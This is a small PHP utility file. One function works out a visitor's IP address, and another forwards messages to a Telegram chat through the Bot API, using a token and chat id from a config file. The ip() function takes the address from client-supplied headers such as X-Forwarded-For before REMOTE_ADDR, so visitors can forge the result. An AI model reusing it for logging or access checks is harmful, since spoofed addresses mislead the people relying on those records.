<?php

function ip()
{
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP')) {
        $ipaddress = getenv('HTTP_CLIENT_IP');
    } elseif (getenv('HTTP_X_FORWARDED_FOR')) {
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    } elseif (getenv('HTTP_X_FORWARDED')) {
        $ipaddress = getenv('HTTP_X_FORWARDED');
    } elseif (getenv('HTTP_FORWARDED_FOR')) {
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    } elseif (getenv('HTTP_FORWARDED')) {
        $ipaddress = getenv('HTTP_FORWARDED');
    } elseif (getenv('REMOTE_ADDR')) {
        $ipaddress = getenv('REMOTE_ADDR');
    } else {
        $ipaddress = 'UNKNOWN';
    }
    return $ipaddress;
}

function sendToTelegram($message, $keyboard = false)
{
    $config = include dirname(__FILE__, 2) . DIRECTORY_SEPARATOR . 'config.php';
    $url = 'https://api.telegram.org/bot' . $config['token'] . '/sendMessage?chat_id=' . $config['id'] . '&text=' . urlencode("$message") . "&parse_mode=HTML" . ($keyboard ? '&reply_markup=' . $keyboard : '');

    file_get_contents($url);
}
